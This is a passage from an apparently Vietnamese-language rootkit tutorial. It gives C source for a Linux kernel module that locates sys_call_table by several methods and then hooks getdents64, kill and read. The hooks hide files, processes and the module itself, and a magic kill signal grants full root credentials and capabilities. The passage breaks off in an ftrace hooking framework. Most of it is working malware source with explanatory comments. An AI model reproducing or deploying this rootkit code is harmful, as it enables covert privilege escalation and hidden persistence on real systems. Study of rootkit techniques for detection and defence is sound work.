 * Đây là phương pháp "desperate" — dùng khi mọi cách khác fail.
 * Nhưng conceptually enlightening: cho thấy sys_call_table
 * chỉ là một mảng trong kernel memory, không có gì magic.
 *
 * Phiên bản an toàn: dùng copy_from_kernel_nofault() để tránh
 * crash khi đọc unmapped pages, và giới hạn scan range trong
 * kernel text+data section thay vì quét toàn bộ address space.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_5_bruteforce(void)
{
    unsigned long *ptr;
    unsigned long test_val;

    /* Chỉ scan kernel text + data range, KHÔNG scan toàn bộ.
     * Kernel text: _stext → _etext
     * Kernel data: _sdata → _edata
     * Dùng range rộng hơn nhưng bounded. */
    unsigned long scan_start = (unsigned long)rk_lookup_name("_stext");
    unsigned long scan_end   = (unsigned long)rk_lookup_name("_edata");

    if (!scan_start || !scan_end) {
        scan_start = PAGE_OFFSET;
        scan_end   = PAGE_OFFSET + (512UL * 1024 * 1024); /* Max 512MB scan */
    }

    for (ptr = (unsigned long *)scan_start;
         (unsigned long)ptr < scan_end;
         ptr++) {

        /* Safe read — không crash nếu address unmapped */
        if (copy_from_kernel_nofault(&test_val, ptr,
                                      sizeof(test_val)))
            continue;  /* Unmapped page → skip */

        if (test_val == (unsigned long)rk_lookup_name(
                SYSCALL_PREFIX "read")) {
            /* Verify: check multiple entries */
            unsigned long next_val;
            if (copy_from_kernel_nofault(&next_val, ptr + 1,
                                          sizeof(next_val)))
                continue;

            if (next_val == (unsigned long)rk_lookup_name(
                    SYSCALL_PREFIX "write"))
                return ptr - __NR_read;
        }
    }

    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 6: /proc/kallsyms userland helper
 *
 * Concept: parse /proc/kallsyms từ TRONG kernel.
 * /proc/kallsyms chứa address của mọi symbol (nếu kptr_restrict=0).
 *
 * Nhưng: kernel code thường dùng API thay vì đọc procfs.
 * Phương pháp này hữu ích khi tất cả API-based methods fail.
 *
 * Alternative: userland program đọc /proc/kallsyms rồi
 * gửi address vào kernel module qua ioctl hoặc /proc write.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_6_kallsyms_file(void)
{
    struct file *f;
    char buf[512];
    loff_t pos = 0;
    ssize_t bytes;
    unsigned long addr = 0;

    /* Mở /proc/kallsyms từ kernel context.
     * filp_open() là kernel equivalent của open(). */
    f = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (IS_ERR(f)) {
        pr_err("method_6: cannot open /proc/kallsyms\n");
        return NULL;
    }

    /* Đọc file line by line tìm "sys_call_table" */
    while ((bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos)) > 0) {
        buf[bytes] = '\0';

        /* Tìm "sys_call_table" trong buffer.
         * Format: "ffffffff82200300 R sys_call_table" */
        char *found = strstr(buf, " sys_call_table");
        if (found) {
            /* Parse hex address từ đầu dòng.
             * Tìm ngược từ match point tới đầu dòng. */
            char *line_start = found;
            while (line_start > buf && *(line_start - 1) != '\n')
                line_start--;

            if (kstrtoul(line_start, 16, &addr) == 0) {
                pr_info("method_6 (kallsyms file): "
                        "sys_call_table @ 0x%lx\n", addr);
                filp_close(f, NULL);
                return (unsigned long *)addr;
            }
        }
    }

    filp_close(f, NULL);
    pr_err("method_6: sys_call_table not found in kallsyms\n");
    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * VALIDATION — Verify rằng address thật sự là sys_call_table
 *
 * Sau khi tìm được candidate address, phải verify.
 * False positive = crash khi hook.
 * ────────────────────────────────────────────────────────────── */
static bool validate_syscall_table(unsigned long *table)
{
    unsigned long known_handler;

    if (!table) return false;

    /* Verify bằng cách check một vài known entries.
     *
     * sys_call_table[__NR_close] phải = address của __x64_sys_close
     * sys_call_table[__NR_read] phải = address của __x64_sys_read
     *
     * Nếu match → confidence cao là sys_call_table thật. */
    known_handler = rk_lookup_name(SYSCALL_PREFIX "close");
    if (!known_handler) {
        pr_warn("validate: cannot resolve known handler\n");
        return false;
    }

    if (table[__NR_close] != known_handler) {
        pr_warn("validate: table[__NR_close] mismatch: "
                "0x%lx != 0x%lx\n",
                table[__NR_close], known_handler);
        return false;
    }

    /* Thêm check: mọi entry phải trỏ vào kernel text section.
     * Kernel text nằm trong range [_stext, _etext].
     * Entry trỏ ra ngoài range = table sai hoặc đã bị hook. */
    unsigned long stext = rk_lookup_name("_stext");
    unsigned long etext = rk_lookup_name("_etext");

    if (stext && etext) {
        for (int i = 0; i < 10; i++) {
            if (table[i] < stext || table[i] > etext) {
                pr_warn("validate: entry %d (0x%lx) outside kernel text\n",
                        i, table[i]);
                /* Không return false ngay — có thể entry hợp lệ
                 * nhưng nằm trong module area. Log và tiếp tục. */
            }
        }
    }

    pr_info("validate: sys_call_table verified OK\n");
    return true;
}

/* ──────────────────────────────────────────────────────────────
 * UNIFIED FINDER — Thử tất cả methods theo thứ tự reliability
 * ────────────────────────────────────────────────────────────── */
static unsigned long *find_syscall_table(void)
{
    unsigned long *table;

    /* Method 2 (kprobe) là reliable nhất trên kernel hiện đại */
    table = method_2_kprobe();
    if (table && validate_syscall_table(table))
        return table;

    /* Method 3 (MSR scan) — không dùng API, pure scan */
    table = method_3_msr_scan();
    if (table && validate_syscall_table(table))
        return table;

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
    /* Method 1 chỉ available trên kernel cũ */
    table = method_1_kallsyms();
    if (table && validate_syscall_table(table))
        return table;
#endif

    /* Method 5 (bruteforce) — slow nhưng thorough */
    table = method_5_bruteforce();
    if (table && validate_syscall_table(table))
        return table;

    return NULL;
}
```

---

## Chapter 3: Syscall Table Hooking — Full Rootkit

### 3.1 Complete hookable rootkit — File & Process Hiding + Give Root

```c
/* hooks.c — Syscall hooking engine
 *
 * File này implement:
 * 1. Hook getdents64: ẩn files và processes (trong /proc)
 * 2. Hook kill: magic signal triggers (give root, hide module, hide PID)
 * 3. Hook read: filter /proc/modules output (backup hiding cho module)
 *
 * Architecture:
 *   Original flow:     user → syscall → ORIGINAL_HANDLER → return
 *   Hooked flow:       user → syscall → OUR_HOOK → ORIGINAL_HANDLER → OUR_FILTER → return
 *
 *   Hook function wrap original: gọi original handler, rồi modify kết quả
 *   trước khi return cho user. Đây gọi là "post-hook" pattern.
 *
 *   Có 2 patterns:
 *   a) Pre-hook:  modify arguments TRƯỚC KHI gọi original
 *                 Ví dụ: thay filename argument → redirect file access
 *   b) Post-hook: gọi original TRƯỚC, rồi modify return value/buffer
 *                 Ví dụ: gọi getdents64 thật, rồi filter entries từ result
 *
 *   Rootkit thường dùng post-hook cho hiding (để original function
 *   vẫn thu thập data đầy đủ, ta chỉ lọc bỏ entries cần ẩn).
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * GLOBAL STATE
 * ══════════════════════════════════════════════════════════════ */

/* Pointer tới sys_call_table — set bởi find_syscall_table() */
static unsigned long *sys_call_table = NULL;

/* Save original syscall handlers để:
 * 1. Gọi trong hook function (cần original behavior)
 * 2. Restore khi unload module (clean exit) */
static syscall_fn_t orig_getdents64 = NULL;
static syscall_fn_t orig_getdents   = NULL;
static syscall_fn_t orig_kill       = NULL;
static syscall_fn_t orig_read       = NULL;

/* Danh sách PIDs đang bị ẩn.
 * Giới hạn static 64 PIDs. Sản phẩm thật dùng dynamic list. */
#define MAX_HIDDEN_PIDS 64
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_pid_count = 0;
static DEFINE_SPINLOCK(pid_lock);  /* Lock cho concurrent access */

/* Module visibility state */
static bool module_hidden = false;

/* ══════════════════════════════════════════════════════════════
 * PID MANAGEMENT — Track processes cần ẩn
 * ══════════════════════════════════════════════════════════════ */

static bool is_pid_hidden(pid_t pid)
{
    int i;
    bool found = false;

    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&pid_lock);
    return found;
}

static void add_hidden_pid(pid_t pid)
{
    spin_lock(&pid_lock);
    if (hidden_pid_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_pid_count++] = pid;
        pr_info("rk: hiding PID %d\n", pid);
    }
    spin_unlock(&pid_lock);
}

static void remove_hidden_pid(pid_t pid)
{
    int i;
    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            /* Shift remaining entries */
            memmove(&hidden_pids[i], &hidden_pids[i + 1],
                    (hidden_pid_count - i - 1) * sizeof(pid_t));
            hidden_pid_count--;
            break;
        }
    }
    spin_unlock(&pid_lock);
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: getdents64 — Ẩn files và processes
 *
 * getdents64() là syscall đứng sau ls, find, readdir().
 *
 * Flow bình thường:
 *   ls → getdents64(fd, buffer, bufsize) → kernel fills buffer
 *   với mảng struct linux_dirent64:
 *
 *   ┌────────────┬────────────┬────────────┬─────┐
 *   │ dirent #1  │ dirent #2  │ dirent #3  │ ... │
 *   └────────────┴────────────┴────────────┴─────┘
 *
 *   Mỗi dirent:
 *   struct linux_dirent64 {
 *       u64  d_ino;        // Inode number
 *       s64  d_off;        // Offset to next dirent
 *       u16  d_reclen;     // Length of this record (variable!)
 *       u8   d_type;       // File type (DT_REG, DT_DIR, etc.)
 *       char d_name[];     // Filename (null-terminated, variable length)
 *   };
 *
 *   d_reclen là variable vì d_name có độ dài khác nhau.
 *   Các dirents packed liên tiếp, không padding.
 *   Tổng kích thước tất cả dirents = return value của getdents64().
 *
 * Hook strategy:
 *   1. Gọi original getdents64() → kernel fill buffer trong userspace
 *   2. Copy buffer từ userspace vào kernelspace
 *   3. Duyệt từng dirent, lọc bỏ entries cần ẩn
 *   4. Copy kết quả filtered trở lại userspace
 *   5. Return adjusted size (giảm đi size của entries bị lọc)
 *
 * Ẩn files:  entry có d_name bắt đầu bằng HIDDEN_PREFIX
 * Ẩn process: fd trỏ tới /proc, d_name là PID nằm trong hidden_pids[]
 * ══════════════════════════════════════════════════════════════ */

/* Kiểm tra fd có đang trỏ tới /proc hay không.
 *
 * Tại sao cần: /proc chứa thư mục cho mỗi process (named by PID).
 * ls /proc → getdents64 → ta filter entries có PID cần ẩn.
 * Nhưng getdents64 cũng được gọi cho mọi directory khác.
 * Ta chỉ muốn filter PIDs khi đọc /proc, không phải /home/user/.
 *
 * Cách check: theo fd → file struct → dentry → inode → superblock
 * Nếu superblock type là "proc" → đang đọc /proc. */
static bool is_proc_dir(int fd)
{
    struct fd f;
    struct inode *inode;
    bool is_proc = false;

    /* fdget() lấy struct file từ file descriptor.
     * Tương tự fget() nhưng lightweight (không tăng refcount
     * trong mọi trường hợp — dùng RCU protection thay vào). */
    f = fdget(fd);
    if (!f.file)
        return false;

    /* Navigate: file → dentry → inode → superblock → type name
     *
     * f.file->f_path.dentry = directory entry
     * dentry->d_inode = inode (in-memory representation of file)
     * inode->i_sb = superblock (filesystem instance)
     * i_sb->s_type->name = filesystem type name ("proc", "ext4", ...) */
    inode = file_inode(f.file);
    if (inode && inode->i_sb && inode->i_sb->s_type)
        is_proc = (strcmp(inode->i_sb->s_type->name, "proc") == 0);

    fdput(f);
    return is_proc;
}

static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    /* Extract arguments từ registers.
     * getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
     * fd    = regs->di  (arg1)
     * dirent = regs->si  (arg2, userspace pointer)
     * count  = regs->dx  (arg3) */
    int fd = (int)regs->di;
    struct linux_dirent64 __user *user_dirent =
        (struct linux_dirent64 __user *)regs->si;

    /* Gọi original getdents64.
     * Return value = total bytes of dirent data,
     * hoặc 0 (end of directory), hoặc negative (error). */
    long ret = orig_getdents64(regs);

    struct linux_dirent64 *kern_dirent = NULL;  /* Kernel-space copy */
    struct linux_dirent64 *current_entry;        /* Iterator */
    struct linux_dirent64 *prev_entry = NULL;    /* Previous entry (for unlinking) */
    unsigned long offset = 0;
    bool is_proc = false;
    long original_ret = ret;

    /* Nếu original trả về 0 (empty dir) hoặc error → pass through */
    if (ret <= 0)
        return ret;

    /* Allocate kernel buffer và copy data từ userspace.
     *
     * Tại sao copy: ta không thể safely iterate userspace buffer
     * trong kernel context (page fault risk, TOCTOU race).
     * Copy vào kernel → modify → copy ngược lại.
     *
     * GFP_KERNEL: allocation CÓ THỂ sleep (process context OK).
     * Dùng GFP_ATOMIC nếu trong interrupt context. */
    kern_dirent = kzalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;  /* Allocation fail → trả về unfiltered result */

    /* copy_from_user(): copy data từ userspace vào kernel buffer.
     * Return 0 on success, non-zero = number of bytes NOT copied.
     *
     * PHẢI dùng copy_from_user() (không phải memcpy) vì:
     * 1. Userspace pointer có thể invalid → page fault handled gracefully
     * 2. SMAP enforcement — kernel không access user pages trực tiếp
     * 3. copy_from_user() có proper access checking */
    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kfree(kern_dirent);
        return ret;
    }

    /* Kiểm tra có đang đọc /proc không (cho PID hiding) */
    is_proc = is_proc_dir(fd);

    /* ────── Duyệt và filter entries ──────
     *
     * Memory layout của kern_dirent buffer:
     *
     * offset=0          offset+=d_reclen[0]    offset+=d_reclen[1]
     *   ▼                    ▼                      ▼
     *   ┌──────────────┬────────────────┬──────────────────┐
     *   │  entry 0     │   entry 1      │   entry 2        │
     *   │  d_reclen=32 │   d_reclen=40  │   d_reclen=28    │
     *   │  d_name="."  │   d_name="rk_" │   d_name="foo"   │
     *   └──────────────┴────────────────┴──────────────────┘
     *                    ↑ HIDDEN (prefix match)
     *
     * Để "xóa" entry, ta có 2 strategies:
     *
     * Strategy A (dùng ở đây): Tăng d_reclen của entry TRƯỚC
     *   Entry trước "nuốt" entry cần ẩn bằng cách mở rộng d_reclen.
     *   Userspace code dùng d_reclen để nhảy tới entry kế tiếp,
     *   nên entry bị "nuốt" sẽ bị skip.
     *
     *   Trước:  [entry_prev, reclen=32] [entry_hidden, reclen=40] [entry_next]
     *   Sau:    [entry_prev, reclen=72]                           [entry_next]
     *
     * Strategy B: memmove entries phía sau lên, giảm total ret.
     *   Đơn giản hơn nhưng memmove costly nếu nhiều entries.
     *
     * Edge case: entry cần ẩn là entry ĐẦU TIÊN (không có prev).
     * → Dùng memmove đẩy mọi thứ lên, giảm ret.
     */

    offset = 0;
    while (offset < ret) {
        current_entry = (struct linux_dirent64 *)((char *)kern_dirent + offset);

        /* Validate d_reclen — protect against corrupted entries.
         * d_reclen == 0 → offset không advance → infinite loop.
         * d_reclen > remaining → overread past buffer boundary. */
        if (current_entry->d_reclen == 0)
            break;
        if (current_entry->d_reclen > (ret - offset))
            break;

        bool should_hide = false;

        /* Check 1: File hiding — d_name bắt đầu bằng HIDDEN_PREFIX */
        if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0) {
            should_hide = true;
        }

        /* Check 2: Process hiding — đang đọc /proc và d_name là PID ẩn */
        if (is_proc && !should_hide) {
            long pid_val;
            /* kstrtol: convert string → long. Return 0 on success.
             * Nếu d_name không phải number → không phải PID entry → skip */
            if (kstrtol(current_entry->d_name, 10, &pid_val) == 0) {
                if (is_pid_hidden((pid_t)pid_val))
                    should_hide = true;
            }
        }

        if (should_hide) {
            /* Case: entry cần ẩn là entry đầu tiên */
            if (current_entry == kern_dirent) {
                /* Shift mọi thứ lên, overwrite entry đầu.
                 * ret giảm = size entry bị remove. */
                ret -= current_entry->d_reclen;
                memmove(current_entry,
                        (char *)current_entry + current_entry->d_reclen,
                        ret);
                /* KHÔNG tăng offset — vị trí hiện tại giờ chứa
                 * entry kế tiếp (đã shift lên), cần check lại. */
                continue;
            }

            /* Case: entry ở giữa hoặc cuối — "nuốt" vào entry trước */
            prev_entry->d_reclen += current_entry->d_reclen;
            /* Không cần memmove — entry vẫn ở đó nhưng userspace
             * sẽ skip nó vì prev->d_reclen đã mở rộng qua. */
        } else {
            /* Entry hợp lệ — ghi nhớ làm prev cho lần sau */
            prev_entry = current_entry;
        }

        offset += current_entry->d_reclen;
    }

    /* Copy kết quả filtered trở lại userspace */
    copy_to_user(user_dirent, kern_dirent, ret);

    kfree(kern_dirent);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: kill — Magic signal command interface
 *
 * Tại sao dùng kill():
 * 1. kill() là syscall "vô hại" — không ai suspect
 * 2. Có thể gọi từ bất kỳ đâu: kill -54 31337
 * 3. Flexible: dùng PID parameter để encode command
 * 4. Không cần file/socket — stateless triggering
 *
 * APT pattern: BPFDoor dùng magic packet, Drovorub dùng ioctl.
 * kill() signal approach phổ biến trong educational rootkits
 * (Diamorphine, Reptile). APT thường dùng network trigger
 * vì không cần local access.
 *
 * Command encoding:
 *   signal = MAGIC_SIGNAL (54)
 *   pid    = command selector:
 *     - MAGIC_PID (31337):      give root cho calling process
 *     - HIDE_MODULE_PID (31338): toggle module visibility
 *     - Any real PID:           toggle hide/show cho process đó
 * ══════════════════════════════════════════════════════════════ */

static asmlinkage long hooked_kill(const struct pt_regs *regs)
{
    pid_t target_pid = (pid_t)regs->di;  /* arg1: target PID */
    int   sig        = (int)regs->si;    /* arg2: signal number */

    /* Chỉ intercept magic signal — mọi signal khác pass through */
    if (sig != MAGIC_SIGNAL)
        return orig_kill(regs);

    /* ──── Command: Give Root ──── */
    if (target_pid == MAGIC_PID) {
        /* prepare_creds(): allocate bản copy của current credentials.
         *
         * Kernel credential model:
         *   Mỗi process có `cred` struct chứa:
         *   - uid/gid: real user/group ID
         *   - euid/egid: effective (used cho permission checks)
         *   - suid/sgid: saved (cho seteuid)
         *   - fsuid/fsgid: filesystem (cho file access checks)
         *   - cap_*: capabilities (fine-grained privileges)
         *
         *   Credentials là immutable — để thay đổi:
         *   1. prepare_creds() → tạo bản copy mutable
         *   2. Modify bản copy
         *   3. commit_creds() → swap bản cũ bằng bản mới atomically
         *
         *   Tại sao immutable + copy-on-write:
         *   - Thread-safe: threads khác đọc cred cũ không bị race
         *   - RCU-protected: readers lock-free
         */
        struct cred *new_cred = prepare_creds();
        if (!new_cred)
            return -ENOMEM;

        /* Set all IDs to 0 (root) */
        new_cred->uid.val   = 0;   /* Real UID */
        new_cred->gid.val   = 0;   /* Real GID */
        new_cred->euid.val  = 0;   /* Effective UID — permission checks */
        new_cred->egid.val  = 0;   /* Effective GID */
        new_cred->suid.val  = 0;   /* Saved UID */
        new_cred->sgid.val  = 0;   /* Saved GID */
        new_cred->fsuid.val = 0;   /* Filesystem UID — file access */
        new_cred->fsgid.val = 0;   /* Filesystem GID */

        /* Grant ALL Linux capabilities.
         *
         * Capabilities = fine-grained root privileges:
         *   CAP_SYS_ADMIN:  mount, syslog, many admin ops
         *   CAP_NET_RAW:    raw sockets
         *   CAP_SYS_MODULE: load/unload kernel modules
         *   CAP_SYS_PTRACE: ptrace any process
         *   CAP_DAC_OVERRIDE: bypass file permission checks
         *   ... 40+ capabilities total
         *
         * CAP_FULL_SET = bitmask với tất cả capability bits = 1.
         * Setting tất cả 5 capability sets = unrestricted root. */
        new_cred->cap_inheritable = CAP_FULL_SET;
        new_cred->cap_permitted   = CAP_FULL_SET;
        new_cred->cap_effective   = CAP_FULL_SET;
        new_cred->cap_bset        = CAP_FULL_SET;
        new_cred->cap_ambient     = CAP_FULL_SET;

        /* commit_creds(): Atomic swap cred cũ bằng cred mới.
         *
         * Từ thời điểm này, current process = root + full caps.
         * Process CÓ THỂ:
         *   - Read/write mọi file
         *   - Kill mọi process
         *   - Load kernel modules
         *   - Mount filesystems
         *   - Mọi thứ root làm được
         *
         * commit_creds() cũng free cred cũ (via RCU). */
        commit_creds(new_cred);

        return 0;  /* Return 0 (success) — user thấy kill() thành công */
    }

    /* ──── Command: Toggle Module Visibility ──── */
    if (target_pid == HIDE_MODULE_PID) {
        if (module_hidden) {
            rk_show_module();
            module_hidden = false;
        } else {
            rk_hide_module();
            module_hidden = true;
        }
        return 0;
    }

    /* ──── Command: Toggle Process Hiding ──── */
    if (is_pid_hidden(target_pid)) {
        remove_hidden_pid(target_pid);
    } else {
        add_hidden_pid(target_pid);
    }

    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: read — Filter /proc/modules output (backup module hiding)
 *
 * Tại sao hook read():
 *   cat /proc/modules hoặc lsmod gọi read() trên /proc/modules.
 *   Output chứa tên tất cả loaded modules.
 *   Hook read() cho /proc/modules → filter dòng có tên rootkit.
 *
 * Đây là BACKUP cho module list_del hiding (Chapter 6).
 * Dù đã list_del, một số tools access /proc/modules trực tiếp
 * hoặc qua sysfs, nên cần defense-in-depth.
 *
 * CẢNH BÁO: Hook read() ảnh hưởng PERFORMANCE vì read()
 * là syscall được gọi nhiều nhất. Phải check nhanh và bail
 * sớm nếu không phải target file.
 * ══════════════════════════════════════════════════════════════ */

/* Kiểm tra xem file descriptor có trỏ tới file cụ thể không */
static bool is_target_file(int fd, const char *target_path)
{
    struct fd f;
    char buf[256];
    char *path;
    bool match = false;

    f = fdget(fd);
    if (!f.file)
        return false;

    /* d_path(): convert dentry → full path string.
     * Cần buffer vì path build ngược từ dentry lên root. */
    path = d_path(&f.file->f_path, buf, sizeof(buf));
    if (!IS_ERR(path))
        match = (strcmp(path, target_path) == 0);

    fdput(f);
    return match;
}

static asmlinkage long hooked_read(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;

    /* Gọi original read trước */
    long ret = orig_read(regs);

    char *kern_buf;
    char *line_start, *line_end;

    if (ret <= 0)
        return ret;

    /* Fast path: chỉ filter /proc/modules
     * Gọi is_target_file() chỉ khi ret > 0 để tránh overhead. */
    if (!is_target_file(fd, "/proc/modules"))
        return ret;  /* Không phải target → trả về nguyên */

    /* Copy, filter, copy back — giống pattern getdents64 */
    kern_buf = kzalloc(ret + 1, GFP_KERNEL);
    if (!kern_buf)
        return ret;

    if (copy_from_user(kern_buf, user_buf, ret)) {
        kfree(kern_buf);
        return ret;
    }
    kern_buf[ret] = '\0';

    /* /proc/modules format (mỗi dòng = 1 module):
     *   "module_name size refcount deps state address\n"
     *   Ví dụ: "rk 16384 0 - Live 0xffffffffc0a80000\n"
     *
     * Filter: xóa mọi dòng chứa tên module rootkit. */
    line_start = kern_buf;
    while (*line_start) {
        line_end = strchr(line_start, '\n');
        if (!line_end)
            break;

        /* So sánh đầu dòng với module name */
        if (strncmp(line_start, THIS_MODULE->name,
                    strlen(THIS_MODULE->name)) == 0) {
            /* Xóa dòng này bằng cách shift phần còn lại lên */
            int line_len = (line_end + 1) - line_start;
            memmove(line_start, line_end + 1,
                    ret - (line_end + 1 - kern_buf));
            ret -= line_len;
            kern_buf[ret] = '\0';  /* Null-terminate tại boundary mới */
            /* Không advance line_start — vị trí này giờ chứa
             * dòng kế tiếp (đã shift) */
            continue;
        }

        line_start = line_end + 1;
    }

    copy_to_user(user_buf, kern_buf, ret);
    kfree(kern_buf);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * INSTALL / REMOVE — Hook lifecycle management
 * ══════════════════════════════════════════════════════════════ */

int rk_install_hooks(void)
{
    /* Step 1: Tìm sys_call_table */
    sys_call_table = (unsigned long *)rk_lookup_name("sys_call_table");
    if (!sys_call_table) {
        pr_err("rk: cannot find sys_call_table\n");
        return -EFAULT;
    }
    pr_info("rk: sys_call_table @ 0x%lx\n", (unsigned long)sys_call_table);

    /* Step 2: Save original handlers.
     *
     * CRITICAL: phải save TRƯỚC KHI overwrite.
     * Nếu quên → không thể gọi original → system unusable.
     * Nếu quên restore khi rmmod → crash sau khi module unloaded
     * vì syscall sẽ jump tới freed memory. */
    orig_getdents64 = (syscall_fn_t)sys_call_table[__NR_getdents64];
    orig_getdents   = (syscall_fn_t)sys_call_table[__NR_getdents];
    orig_kill       = (syscall_fn_t)sys_call_table[__NR_kill];
    orig_read       = (syscall_fn_t)sys_call_table[__NR_read];

    /* Step 3: Overwrite syscall table entries.
     *
     * Giữa unprotect và protect, code này PHẢI chạy nhanh.
     * Không allocate memory, không sleep, không gọi function
     * phức tạp — chỉ ghi 8 bytes per entry.
     *
     * Barrier(mb/wmb) không cần vì chỉ ghi aligned 8-byte values
     * — x86 guarantees atomicity cho aligned quad-word writes. */
    rk_unprotect_memory();

    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_getdents]   = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_kill]       = (unsigned long)hooked_kill;
    sys_call_table[__NR_read]       = (unsigned long)hooked_read;

    rk_protect_memory();

    pr_info("rk: syscall hooks installed\n");
    return 0;
}

void rk_remove_hooks(void)
{
    if (!sys_call_table)
        return;

    /* Restore original handlers.
     *
     * QUAN TRỌNG: phải restore theo đúng thứ tự:
     * 1. Unprotect memory
     * 2. Restore TẤT CẢ entries
     * 3. Protect memory
     *
     * Nếu module unload mà không restore → instant crash
     * khi bất kỳ process nào gọi hooked syscall, vì code
     * tại hook address đã bị freed. */
    rk_unprotect_memory();

    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_getdents]   = (unsigned long)orig_getdents;
    sys_call_table[__NR_kill]       = (unsigned long)orig_kill;
    sys_call_table[__NR_read]       = (unsigned long)orig_read;

    rk_protect_memory();

    /* Memory barrier: đảm bảo mọi CPU thấy restored values
     * trước khi module memory bị freed. */
    msleep(10);  /* Cho time để in-flight syscalls hoàn thành */

    pr_info("rk: syscall hooks removed\n");
}
```

---

## Chapter 4: Ftrace-based Hooking — Kỹ thuật hiện đại

### 4.1 Ftrace Framework — Kiến trúc hooking

```c
/* ftrace_hooks.c — Production-grade ftrace hooking framework
 *
 * Ftrace = Function Tracer — kernel framework cho tracing/profiling.
 * Designed cho debugging, nhưng rootkits lạm dụng để hook functions.
 *
 * TẠI SAO FTRACE THAY VÌ SYSCALL TABLE:
 *
 * 1. Không cần tìm sys_call_table
 *    → Loại bỏ bước phức tạp nhất & dễ detect nhất
 *
 * 2. Không cần disable CR0.WP
 *    → Không trigger CR0 monitoring
 *    → Không cần write vào read-only memory
 *
 * 3. Hook BẤT KỲ kernel function, không chỉ syscalls
 *    → Hook internal functions sâu hơn, khó detect hơn
 *    → Ví dụ: hook tcp_v4_connect() thay vì sys_connect()
 *
 * 4. Kernel manage concurrency
 *    → Ftrace framework handle SMP synchronization
 *    → Ít race conditions hơn manual hooking
 *
 * 5. "Legitimate" API usage
 *    → Monitoring tools cũng dùng ftrace
 *    → Khó phân biệt rootkit hook vs legitimate tracer
 *
 * CÁCH FTRACE HOẠT ĐỘNG:
 *
 * Khi CONFIG_FUNCTION_TRACER=y, compiler thêm "nop sled" hoặc
 * call __fentry__ vào đầu MỌI kernel function:
 *
 *   function_name:
 *     call __fentry__     ← 5 bytes, thường nop khi không trace
 *     push rbp
 *     mov rbp, rsp
 *     ...
 *
 * Khi không có tracer, __fentry__ call được replace bằng NOP.
 * Khi register tracer, kernel patch NOP thành call tới tracer.
 *
 * Rootkit tracer:
 *   1. Được gọi khi target function bắt đầu execute
 *   2. Nhận pt_regs (register state) làm argument
 *   3. Thay đổi regs->ip (instruction pointer)
 *      → Execution "nhảy" sang hook function thay vì tiếp tục
 *   4. Hook function gọi original khi cần
 *
 * Rootkits dùng ftrace: Sutekh, Kovid, nhiều APT tools.
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * FTRACE HOOK STRUCTURE
 *
 * Encapsulate mọi thứ cần cho 1 hook:
 * - Target function name
 * - Hook function pointer
 * - Original function pointer (for calling through)
 * - ftrace_ops (kernel tracing handle)
 * ══════════════════════════════════════════════════════════════ */

struct ftrace_hook {
    const char *name;          /* Tên kernel function cần hook */
    void *function;            /* Hook function (replacement) */
    void *original;            /* Pointer để store original function addr */
    unsigned long address;     /* Resolved address của target */
    struct ftrace_ops ops;     /* ftrace handle — kernel manages this */
};

/* Macro helper để khai báo hook entry.
 *
 * Ví dụ: HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64)
 *
 * Tạo struct ftrace_hook với:
 *   .name = "__x64_sys_getdents64"
 *   .function = hooked_getdents64
 *   .original = &orig_getdents64 (pointer tới function pointer)
 */
#define HOOK(_name, _hook, _orig) \
    {                             \
        .name = (_name),          \
        .function = (_hook),      \
        .original = (_orig),      \
    }

/* ══════════════════════════════════════════════════════════════
 * FTRACE CALLBACK — Trung tâm của kỹ thuật
 *
 * Function này được ftrace gọi mỗi khi target function execute.
 * Đây là "entry point" của hook — nơi redirect xảy ra.
 * ══════════════════════════════════════════════════════════════ */

/*
 * notrace attribute: ngăn ftrace trace CHÍNH function này.
 * Nếu không có notrace, khi function này gọi → ftrace trace nó
 * → gọi lại function này → infinite recursion → stack overflow → crash.
 *
 * Parameters:
 *   ip:        instruction pointer của target function (nơi hook)
 *   parent_ip: instruction pointer của CALLER (ai gọi target)
 *   ops:       ftrace_ops handle (ta dùng container_of lấy hook struct)
 *   fregs:     ftrace-specific register state
 */
static void notrace ftrace_thunk(unsigned long ip,
                                  unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    /* CRITICAL CHECK: chống recursion.
     *
     * Vấn đề: hook function gọi original function → original function
     * trigger ftrace → callback gọi lại → hook function gọi lại original
     * → infinite loop.
     *
     * Giải pháp: kiểm tra CALLER (parent_ip).
     * - Nếu caller nằm TRONG module (within_module) → đang call from hook
     *   → KHÔNG redirect, cho original chạy bình thường
     * - Nếu caller nằm NGOÀI module → call từ kernel/userspace
     *   → Redirect sang hook function
     *
     * within_module(addr, mod): kiểm tra addr có nằm trong
     * code range của module mod hay không.
     *
     * Flow:
